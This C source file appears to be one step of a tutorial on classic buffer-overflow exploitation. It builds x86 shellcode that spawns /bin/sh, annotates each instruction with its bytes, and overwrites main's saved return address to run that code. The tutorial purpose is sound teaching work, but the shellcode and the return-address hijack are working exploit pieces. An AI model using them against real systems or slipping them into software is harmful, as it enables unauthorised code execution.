//
// shellcode.c
//
// Step 2: preparing position independent code that will call exec(/bin/sh)
//
// shellcode size: 68 bytes without trailing null, but containing null bytes inside
//

#include <string.h>

// The stack layout of the main function at the moment it is entered follows below.
// The amount of spaces reflects the actual amount of bytes. Dots in buffers
// are the data bytes, and spaces are the stack padding placed by the compiler.
//     ret - address to which the processor will transfer its execution after
//           leaving the function
//     sfp - Stored Frame Pointer or EBP of the previous function that called main()
//
// bottom of                                                            top of
// memory                                                               memory
//                    _ret  sfp   ret   argc  argv  argp
// <------           [    ][    ][    ][    ][    ][    ]
//                   ^     ^
//                  esp   ebp
// top of                                                            bottom of
// stack                                                                 stack

// Note, that exit(0) call in the shell code is not compulsory, it is there in
// order to terminate program gracefully, if execve(/bin/sh) failed for some
// reason. exit(0) call adds 12 bytes to the shellcode.

char shellcode_buffer[128];

__attribute__ ((naked)) void shellcode_function() {
    __asm__ (
        "jmp     1f                   \n\t"    // eb 36                         : 2  bytes - jump to the label of call instruction below
        "2:                           \n\t"    //                                 0  bytes - label to be returned to from call instruction below
        "popl    %esi                 \n\t"    // 5e                            : 1  byte  - capture the absolute address of the /bin/sh string in memory
        "movl    %esi, 4f-3f(%esi)    \n\t"    // 89 b6 08 00 00 00             : 6  bytes - store address of /bin/sh in argv[0] right after our shellcode
        "movb    $0x0, 0x7(%esi)      \n\t"    // c6 46 07 00                   : 4  bytes - this instruction is crucial, it terminates the /bin/sh with zero
        "movl    $0x0, 5f-3f(%esi)    \n\t"    // c7 86 0c 00 00 00 00 00 00 00 : 10 bytes - store null pointer address in argv[1]
        "movl    $0xb, %eax           \n\t"    // b8 0b 00 00 00                : 5  bytes - eax = 11, index of exec service in system call table
        "movl    %esi, %ebx           \n\t"    // 89 f3                         : 2  bytes - esi = address of /bin/sh
        "leal    4f-3f(%esi), %ecx    \n\t"    // 8d 8e 08 00 00 00             : 6  bytes - ecx = address of address of /bin/sh
        "leal    5f-3f(%esi), %edx    \n\t"    // 8d 96 0c 00 00 00             : 6  bytes - edx = address of address of NULL
        "int     $0x80                \n\t"    // cd 80                         : 2  bytes - execve(/bin/sh) system call
        "movl    $1, %eax             \n\t"    // b8 01 00 00 00                : 5  bytes - eax = 1, index of exit service in system call table
        "movl    $0, %ebx             \n\t"    // bb 00 00 00 00                : 5  bytes - ebx = 0, exit status code, that means success
        "int     $0x80                \n\t"    // cd 80                         : 2  bytes - exit(0) system call
        "1:                           \n\t"    //                                 0  bytes - label to be jumped to from the first jmp instruction
        "call    2b                   \n\t"    // e8 c5 ff ff ff                : 5  bytes - push the address of the next instruction which is actually a string /bin/sh
        "3:                           \n\t"    //                                 0  bytes - label that denotes the start of the string in our shellcode
        ".string \"/bin/sh\"          \n\t"    // 2f 62 69 6e 2f 73 68 00       : 8  bytes - '/', 'b', 'i', 'n', '/', 's', 'h', '\0'
        "4:                           \n\t"    //                                 0  bytes - label that denotes the start of argv[0] parameter for execve
        ".long   0                    \n\t"    // 00 00 00 00                   : 4  bytes - argv[0], will be filled by the shellcode during runtime
        "5:                           \n\t"    //                                 0  bytes - label that denotes the start of argv[1] parameter for execve
        ".long   0                    \n\t"    // 00 00 00 00                   : 4  bytes - argv[1], will be filled by the shellcode during runtime
    );
}

void main() {
    int* _ret;

    // copy the executable code from the code section to the global static buffer, where the code has RWX permissions
    memcpy(shellcode_buffer, shellcode_function, (char*)main - (char*)shellcode_function);

    // obtain the offset in the stack of the return address from main (the ret variable in the diagram above)
    _ret = (int*)&_ret + 2;

    // set the return address in the stack to point to our shellcode buffer
    *_ret = (int)shellcode_buffer;
}
